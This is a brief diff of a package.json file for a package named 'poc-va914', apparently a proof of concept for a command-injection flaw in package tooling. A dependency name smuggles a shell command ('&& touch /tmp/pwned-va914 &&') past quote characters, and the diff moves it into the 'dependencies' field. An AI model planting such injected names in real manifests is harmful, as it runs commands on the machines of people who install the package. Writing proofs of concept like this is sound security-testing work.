@@ -1,6 +1,7 @@
 {
   "name": "poc-va914",
-  "versions": {
-    "fooo\" && touch /tmp/pwned-va914 && \"": "1.0.0"
+  "version": "1.0.0",
+  "dependencies": {
+    "foo\" && touch /tmp/pwned-va914 && \"": "1.0.0"
   }
 }
